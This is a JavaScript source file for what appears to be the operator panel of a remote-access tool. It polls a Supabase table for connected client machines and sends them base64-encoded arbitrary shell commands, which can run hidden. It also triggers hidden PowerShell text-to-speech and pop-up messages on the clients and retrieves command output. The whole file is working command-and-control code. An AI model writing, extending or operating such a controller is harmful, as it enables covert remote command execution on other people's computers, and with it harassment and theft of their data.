const state = {
    rows: [],
    url: localStorage.getItem("supa_url"),
    apiKey: localStorage.getItem("supa_key"),
    popupMode: null,
    popupUser: null,
    hoveredUser: null,
    selectedVoice: "David",
    selectedVis: true,
};

const $ = (id) => document.getElementById(id);

document.addEventListener("contextmenu", (e) => e.preventDefault());

function getStatus(user) {
    const diff = (Date.now() - new Date(user.updated_at).getTime()) / 1000;
    if (diff < 10) return "green";
    if (diff < 60) return "yellow";
    return "red";
}

function updateOptionsUI() {
    $("voice-david").className =
        "opt-btn" + (state.selectedVoice === "David" ? " active" : "");
    $("voice-zira").className =
        "opt-btn" + (state.selectedVoice === "Zira" ? " active" : "");
    $("vis-true").className = "opt-btn" + (state.selectedVis ? " active" : "");
    $("vis-false").className =
        "opt-btn" + (!state.selectedVis ? " active" : "");
}

function renderGrid() {
    const grid = $("user-grid");
    const sorted = [...state.rows].sort((a, b) => {
        const order = { green: 0, yellow: 1, red: 2 };
        return (
            order[getStatus(a)] - order[getStatus(b)] ||
            a.username.localeCompare(b.username)
        );
    });

    $("online-count").textContent = sorted.filter(
        (u) => getStatus(u) === "green",
    ).length;
    $("total-count").textContent = sorted.length;

    if (!sorted.length) {
        grid.innerHTML = '<div class="empty">NO CLIENTS CONNECTED</div>';
        return;
    }

    grid.innerHTML = "";
    sorted.forEach((user, index) => {
        const status = getStatus(user);
        const alive = status === "green";
        const card = document.createElement("div");
        card.className = "user-card";

        const lastSeenDate = new Date(user.updated_at);
        const tsText = alive
            ? ""
            : `Last seen: ${lastSeenDate.toLocaleDateString()} ${lastSeenDate.toLocaleTimeString()}`;

        const showHint = index === 0;

// six seven
        
        card.innerHTML = `
            <div class="card-header">
                <div class="status-ring status-${status}"></div>
                <span class="card-username ${alive ? "" : "offline"}">${user.username}</span>
            </div>
            <div class="card-ts">${tsText}</div>
            <div class="card-actions">
                <button class="card-btn primary ${alive ? "" : "disabled"}" data-action="cmd">
                    CMD ${showHint ? '<span class="btn-hint">C</span>' : ""}
                </button>
                <button class="card-btn ${alive ? "" : "disabled"}" data-action="speak">
                    SPK ${showHint ? '<span class="btn-hint">S</span>' : ""}
                </button>
                <button class="card-btn ${alive ? "" : "disabled"}" data-action="popup_msg">
                    MSG ${showHint ? '<span class="btn-hint">A</span>' : ""}
                </button>
                <button class="card-btn" data-action="output">
                    OUT ${showHint ? '<span class="btn-hint">V</span>' : ""}
                </button>
            </div>
        `;

        card.addEventListener("mouseenter", () => (state.hoveredUser = user));
        card.addEventListener("mouseleave", () => (state.hoveredUser = null));

        card.addEventListener("click", (e) => {
            const btn = e.target.closest(".card-btn");
            if (!btn) return;

            const action = btn.dataset.action;
            if (!action) return;
            if (action === "cmd") openPopup("cmd", user);
            if (action === "speak") openPopup("speak", user);
            if (action === "popup_msg") openPopup("popup_msg", user);
            if (action === "output") doViewOutput(user);
        });
        grid.appendChild(card);
    });
}

function openPopup(mode, user) {
    state.popupMode = mode;
    state.popupUser = user;
    state.selectedVis = user.visible;

    $("popup-input").value = "";
    $("popup-target-label").textContent = user.username;
    $("popup-overlay").classList.add("open");

    $("vis-section").style.display = mode === "cmd" ? "flex" : "none";
    $("voice-section").style.display = mode === "speak" ? "flex" : "none";
    $("voice-config").style.display = mode === "speak" ? "flex" : "none";

    if (mode === "cmd") $("popup-mode-label").textContent = "Execute Command";
    else if (mode === "speak")
        $("popup-mode-label").textContent = "Voice Message";
    else $("popup-mode-label").textContent = "Message Box";

    updateOptionsUI();
    setTimeout(() => $("popup-input").focus(), 50);
}

function closePopup() {
    $("popup-overlay").classList.remove("open");
    state.popupMode = null;
    state.popupUser = null;
}

function formatPSString(str) {
    const escaped = str.replace(/'/g, "''");
    return escaped
        .split(/\r?\n/)
        .map((line) => `'${line}'`)
        .join(" + [char]13 + ");
}

async function doSendPopup() {
    const user = state.popupUser;
    const mode = state.popupMode;
    const val = $("popup-input").value.trim();
    if (!user) return;

    let rawCmd = "";
    if (val) {
        if (mode === "cmd") rawCmd = val;
        else if (mode === "speak") {
            const msg = val;
            rawCmd = `powershell -W H -C \"$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${state.selectedVoice}*'}; $s.Rate=${state.selectedSpeed};$s.Volume=${state.selectedVolume};$s.Speak('<pitch middle=\\"${state.selectedPitch}\\">${msg}</pitch>')"`;
        } else {
            const msg = formatPSString(val);
            rawCmd = `powershell -W H -C "(New-Object -Com WScript.Shell).Popup(${msg})"`;
            
        }
    }

    const body = {};
    if (rawCmd) {
        body.cmd = btoa(rawCmd);
        body.run = true;
    }
    if (mode === "cmd") body.visible = state.selectedVis;

    try {
        await fetch(`${state.url}?username=eq.${user.username}`, {
            method: "PATCH",
            headers: {
                apikey: state.apiKey,
                Authorization: `Bearer ${state.apiKey}`,
                "Content-Type": "application/json",
            },
            body: JSON.stringify(body),
        });
        closePopup();
        fetchData();
    } catch (e) {
        console.error("Trans Error", e);
    }
}

async function doViewOutput(user) {
    try {
        const res = await fetch(
            `${state.url}?select=out&username=eq.${user.username}`,
            {
                headers: {
                    apikey: state.apiKey,
                    Authorization: `Bearer ${state.apiKey}`,
                },
            },
        );
        const data = await res.json();
        if (data[0]?.out) {
            const decoded = atob(data[0].out);
            navigator.clipboard.writeText(decoded).catch(() => {});
            alert(decoded);
        }
    } catch (e) {
        console.error(e);
    }
}

async function fetchData() {
    try {
        const res = await fetch(
            `${state.url}?select=username,updated_at,visible`,
            {
                headers: {
                    apikey: state.apiKey,
                    Authorization: `Bearer ${state.apiKey}`,
                },
            },
        );
        state.rows = await res.json();
        renderGrid();
    } catch (e) {
        console.error(e);
    }
}

function init() {
    if (!state.url || !state.apiKey) {
        const u = prompt("Supabase URL:");
        const k = prompt("API Key:");
        if (u && k) {
            state.url = u;
            state.apiKey = k;
            localStorage.setItem("supa_url", u);
            localStorage.setItem("supa_key", k);
        }
    }

    fetchData();
    setInterval(fetchData, 4000);

    $("voice-david").onclick = () => {
        state.selectedVoice = "David";
        updateOptionsUI();
    };
    $("voice-zira").onclick = () => {
        state.selectedVoice = "Zira";
        updateOptionsUI();
    };
    $("vis-true").onclick = () => {
        state.selectedVis = true;
        updateOptionsUI();
    };
    $("vis-false").onclick = () => {
        state.selectedVis = false;
        updateOptionsUI();
    };

    $("volume-slider").oninput = (e) => {
        const val = e.target.value;
        $("volume-value").textContent = `${val}%`;
        state.selectedVolume = val;
    };
    $("speed-slider").oninput = (e) => {
        const val = e.target.value;
        $("speed-value").textContent = `${val}`;
        state.selectedSpeed = val;
    };
    $("pitch-slider").oninput = (e) => {
        const val = e.target.value;
        $("pitch-value").textContent = `${val}`;
        state.selectedPitch = val;
    };


    document.addEventListener("keydown", (e) => {
        if (state.popupMode) {
            if (e.key === "Escape") closePopup();
            if (
                e.key === "Shift" &&
                document.activeElement !== $("popup-input")
            ) {
                if (state.popupMode === "speak") {
                    state.selectedVoice =
                        state.selectedVoice === "David" ? "Zira" : "David";
                } else if (state.popupMode === "cmd") {
                    state.selectedVis = !state.selectedVis;
                }
                updateOptionsUI();
            }
            return;
        }
        const u = state.hoveredUser;
        if (!u) return;
        const alive = getStatus(u) === "green";
        const key = e.key.toLowerCase();
        if (key === "c" && alive) openPopup("cmd", u);
        if (key === "s" && alive) {
            state.selectedVoice = e.shiftKey ? "Zira" : "David";
            openPopup("speak", u);
        }
        if (key === "a" && alive) openPopup("popup_msg", u);
        if (key === "v") doViewOutput(u);
    });

    $("popup-cancel").onclick = closePopup;
    $("popup-confirm").onclick = doSendPopup;
    $("popup-input").addEventListener("keydown", (e) => {
        if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) doSendPopup();
    });
}
init();
